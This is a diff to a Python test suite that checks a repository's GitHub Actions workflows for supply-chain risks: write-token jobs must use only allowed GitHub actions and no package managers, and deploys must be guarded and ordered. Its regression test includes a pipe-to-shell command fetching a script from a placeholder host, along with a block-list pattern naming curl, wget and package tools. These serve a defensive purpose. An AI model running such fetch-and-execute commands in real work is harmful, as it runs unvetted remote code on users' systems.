@@ -7,11 +7,64 @@ REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
 WORKFLOW_DIRECTORY = REPOSITORY_ROOT / ".github" / "workflows"
 FULL_COMMIT_SHA = re.compile(r"[0-9a-fA-F]{40}")
 
+# The only actions a job holding a write token may use: GitHub's own, and only those such a job
+# needs. Their SHA pins are enforced by test_every_remote_action_is_pinned_to_a_full_commit_sha.
+WRITE_TOKEN_JOB_ACTIONS = {"actions/checkout", "actions/download-artifact", "actions/setup-python"}
+# Anything that installs, fetches or executes packages or remote code. Next to a write token, a
+# compromised dependency could push with it or rewrite a script a later privileged step runs.
+PACKAGE_TOOLING = re.compile(
+    r"(?<![\w./-])(?:pip[0-9.]*|pipx|uvx?|poetry|pdm|conda|mamba|micromamba|npm|npx|yarn|pnpm"
+    r"|bunx?|deno|corepack|gem|cargo|apt|apt-get|brew|curl|wget)(?![\w.-])"
+    r"|-m\s+(?:pip|ensurepip|venv)\b"
+)
+
 
 def _workflow_files():
     return sorted(
         (*WORKFLOW_DIRECTORY.glob("*.yml"), *WORKFLOW_DIRECTORY.glob("*.yaml"))
     )
+
+
+def _jobs(source):
+    """Map each job id to its block of text (two-space job keys under top-level `jobs:`)."""
+    body = source[source.index("\njobs:\n") + len("\njobs:\n"):]
+    jobs, name, lines = {}, None, []
+    for line in body.splitlines():
+        header = re.match(r"^  ([A-Za-z0-9_-]+):\s*$", line)
+        if header or (line.strip() and not line.startswith(" ")):
+            if name:
+                jobs[name] = "\n".join(lines)
+            if not header:
+                break
+            name, lines = header.group(1), []
+        elif name:
+            lines.append(line)
+    if name and name not in jobs:
+        jobs[name] = "\n".join(lines)
+    return jobs
+
+
+def _permissions(block, indent):
+    """The `permissions:` value at this indentation (inline or mapping), or None if absent."""
+    match = re.search(rf"^{' ' * indent}permissions:(.*)$", block, re.M)
+    if not match:
+        return None
+    following = block[match.end():].splitlines()[1:]
+    mapping = []
+    for line in following:
+        if line.strip() and len(line) - len(line.lstrip()) <= indent:
+            break
+        mapping.append(line)
+    return match.group(1) + "\n" + "\n".join(mapping)
+
+
+def _holds_write_token(job, top_level):
+    permissions = _permissions(job, 4)
+    if permissions is None:
+        permissions = _permissions(top_level, 0)
+    if permissions is None:
+        return True                     # the repository default may be read/write
+    return bool(re.search(r"\bwrite(-all)?\b", re.sub(r"#.*", "", permissions)))
 
 
 def _shell_run_blocks(source):
@@ -125,7 +178,13 @@ class WorkflowGuardTest(unittest.TestCase):
         self.assertIn('if [ -L "$state_directory_path" ]', source)
         self.assertIn("cp --remove-destination --", source)
         self.assertIn("http.followRedirects=false", source)
-        self.assertEqual(source.count('if [ "${origin_url%.git}" != "$expected_origin" ]'), 2)
+        # The restore, and every step that sends the token, refuses an unexpected origin first.
+        origin_check = 'if [ "${origin_url%.git}" != "$expected_origin" ]'
+        credentialed = [b for b in _shell_run_blocks(source) if "extraheader" in b]
+        self.assertEqual(len(credentialed), 2)            # the site deploy and the state persist
+        for block in credentialed:
+            self.assertLess(block.index(origin_check), block.index("extraheader"))
+        self.assertEqual(source.count(origin_check), 3)
 
         restore = source.index("- name: Restore mutable runtime state from live-data")
         freeze = source.index("- name: Freeze data snapshot")
@@ -141,6 +200,134 @@ class WorkflowGuardTest(unittest.TestCase):
         self.assertIn("$STATE_DIRECTORY/signal_state.json", persistence)
         self.assertIn("$STATE_DIRECTORY/live_track_record.json", persistence)
         self.assertNotIn("price.json", persistence)
+
+
+    def test_privileged_refresh_job_is_split_from_the_build(self):
+        source = (WORKFLOW_DIRECTORY / "refresh.yml").read_text(encoding="utf-8")
+        jobs = _jobs(source)
+        top_level = source[:source.index("\njobs:")]
+        self.assertRegex(top_level, r"permissions:\s*\n\s*contents: read")
+        self.assertTrue(_holds_write_token(jobs["publish"], top_level))
+        self.assertFalse(_holds_write_token(jobs["build"], top_level))
+        self.assertNotIn("GMAIL_APP_PASSWORD", jobs["build"])
+
+    def test_jobs_holding_a_write_token_run_no_third_party_code(self):
+        # Any job that can push (refresh's publish, price) runs only GitHub's own actions it needs,
+        # git and this repository's scripts: no other action and no package manager, ever.
+        checked = 0
+        for workflow in _workflow_files():
+            source = workflow.read_text(encoding="utf-8")
+            top_level = source[:source.index("\njobs:")]
+            for name, job in _jobs(source).items():
+                if not _holds_write_token(job, top_level):
+                    continue
+                checked += 1
+                for action in re.findall(r"^\s*(?:-\s*)?uses:\s*['\"]?([^\s#'\"@]+)", job, re.M):
+                    with self.subTest(workflow=workflow.name, job=name, uses=action):
+                        self.assertIn(action, WRITE_TOKEN_JOB_ACTIONS)
+                for block in _shell_run_blocks(job):
+                    tool = PACKAGE_TOOLING.search(re.sub(r"\\\s*\n\s*", " ", block))
+                    with self.subTest(workflow=workflow.name, job=name, tool=tool and tool.group(0)):
+                        self.assertIsNone(tool)
+        self.assertGreaterEqual(checked, 2, "expected refresh.yml's publish job and price.yml's job")
+
+    def test_write_token_guard_catches_installs_and_foreign_actions(self):
+        # The guard's own regression test: each of these, added to the write-token job, must trip it.
+        for added in (
+            "      - uses: actions/setup-node@0123456789abcdef0123456789abcdef01234567\n",
+            "      - uses: someone/some-action@0123456789abcdef0123456789abcdef01234567\n",
+            "      - uses: peaceiris/actions-gh-pages@84c30a85c19949d7eee79c4ff27748b70285e453\n",
+            "      - uses: ./.github/actions/local\n",
+            "      - uses: docker://alpine:3.20\n",
+            "      - run: pip3 install some-package\n",
+            "      - run: python -m pip install requests\n",
+            "      - run: yarn add left-pad\n",
+            "      - run: pnpm dlx cowsay hi\n",
+            "      - run: npm exec -- eslint\n",
+            "      - run: pipx run black .\n",
+            "      - run: |\n          set -e\n          curl -sSL https://example.invalid/i.sh | sh\n",
+        ):
+            job = "    permissions:\n      contents: write\n    steps:\n" + added
+            violations = [a for a in re.findall(r"^\s*(?:-\s*)?uses:\s*['\"]?([^\s#'\"@]+)", job, re.M)
+                          if a not in WRITE_TOKEN_JOB_ACTIONS]
+            violations += [b for b in _shell_run_blocks(job) if PACKAGE_TOOLING.search(b)]
+            with self.subTest(added=added.strip()):
+                self.assertTrue(_holds_write_token(job, "permissions:\n  contents: read\n"))
+                self.assertTrue(violations)
+        for allowed in ("python backend/signal_alert.py --data public/data.json",
+                        "python scripts/validate_frozen_payload.py public/data.json",
+                        'git -C "$state_worktree" add "$STATE_DIRECTORY/signal_state.json"',
+                        'cp -RL dist/. "$site_worktree/"'):
+            with self.subTest(allowed=allowed):
+                self.assertIsNone(PACKAGE_TOOLING.search(allowed))
+
+    def test_publish_never_deploys_or_persists_a_superseded_build(self):
+        # A re-run of an old run's publish job must not roll the site back or overwrite runtime
+        # state that later runs persisted; and what is deployed must pass the payload validator.
+        source = (WORKFLOW_DIRECTORY / "refresh.yml").read_text(encoding="utf-8")
+        jobs = _jobs(source)
+        tree = 'git rev-parse "origin/${STATE_BRANCH}:${STATE_DIRECTORY}"'
+
+        restore = next(b for b in _shell_run_blocks(jobs["build"]) if "load_record(); load_state()" in b)
+        self.assertIn(f'echo "tree=$({tree})"', restore)
+        self.assertIn("STATE_BASE_FILE: ${{ runner.temp }}/runtime-state/restored-from", jobs["build"])
+
+        publish = jobs["publish"]
+        check_at = publish.index("- name: Refuse a stale or superseded build")
+        deploy_at = publish.index("- name: Deploy to GitHub Pages")
+        alert_at = publish.index("- name: Check 1W signal and send alert")
+        self.assertLess(publish.index("- name: Place build outputs"), check_at)
+        self.assertLess(check_at, deploy_at)
+        self.assertLess(deploy_at, alert_at)
+        check = next(b for b in _shell_run_blocks(publish) if "validate_frozen_payload.py" in b)
+        self.assertIn("cmp dist/data.json public/data.json", check)
+        self.assertIn(f'if [ "$({tree})" != "$base_tree" ]; then', check)
+        self.assertIn("python scripts/validate_frozen_payload.py public/data.json", check)
+        self.assertIn("--max-age-minutes", check)
+        self.assertIn("--not-older-than", check)
+        self.assertIn('git show "origin/${PAGES_BRANCH}:data.json"', check)
+
+        persist = next(b for b in _shell_run_blocks(publish) if 'push origin "HEAD:${STATE_BRANCH}"' in b)
+        guard = persist.index(f'if [ "$({tree})" != "$base_tree" ]; then')
+        self.assertLess(persist.index("diff --staged --quiet"), guard)
+        self.assertLess(guard, persist.index("commit -m"))
+
+    def test_site_deploy_mirrors_the_replaced_action(self):
+        # What peaceiris/actions-gh-pages did with this workflow's inputs: replace the branch's files
+        # with dist/ (keep_files false), add .nojekyll, commit on top of the history (no
+        # force_orphan) and push without --force.
+        source = (WORKFLOW_DIRECTORY / "refresh.yml").read_text(encoding="utf-8")
+        deploy = next(b for b in _shell_run_blocks(_jobs(source)["publish"])
+                      if 'push origin "HEAD:${PAGES_BRANCH}"' in b)
+        self.assertIn("PAGES_BRANCH: gh-pages", source)
+        self.assertIn("rm -r -q --ignore-unmatch -- .", deploy)
+        self.assertIn('cp -RL dist/. "$site_worktree/"', deploy)
+        self.assertIn('touch "$site_worktree/.nojekyll"', deploy)
+        self.assertIn('git worktree add --detach "$site_worktree" "origin/${PAGES_BRANCH}"', deploy)
+        self.assertNotRegex(deploy, r"push\b[^\n]*(--force|\s-f\b|\+HEAD)")
+        self.assertIn("http.followRedirects=false", deploy)
+
+    def test_dependabot_groups_leave_majors_to_their_own_prs(self):
+        # A major bump (e.g. one half of the upload/download-artifact pair) must not ride along in
+        # a routine grouped PR. Only the react group takes majors: its packages move in lockstep.
+        source = (REPOSITORY_ROOT / ".github" / "dependabot.yml").read_text(encoding="utf-8")
+        groups = re.findall(r"^      ([\w-]+):\n((?:        .*\n|[ \t]*\n)*)", source, re.M)
+        self.assertEqual({name for name, _ in groups}, {"actions", "react", "npm-minor-and-patch", "python"})
+        for name, body in groups:
+            if name == "react":
+                continue
+            with self.subTest(group=name):
+                types = re.search(r"^        update-types:\n((?:          - .*\n)+)", body, re.M)
+                self.assertIsNotNone(types, f"group {name} must restrict update-types")
+                self.assertEqual(sorted(re.findall(r"- (\w+)", types.group(1))), ["minor", "patch"])
+
+    def test_npm_installs_never_run_lifecycle_scripts(self):
+        for workflow in _workflow_files():
+            for command in _shell_run_blocks(workflow.read_text(encoding="utf-8")):
+                for line in command.splitlines():
+                    # Command position only (start of line, or after if/then/&&/;), not echo text.
+                    if re.search(r"(^|\bif |\bthen |&& |; )\s*npm (ci|install)\b", line.strip()):
+                        self.assertIn("--ignore-scripts", line, f"{workflow.name}: {line.strip()}")
 
 
 if __name__ == "__main__":
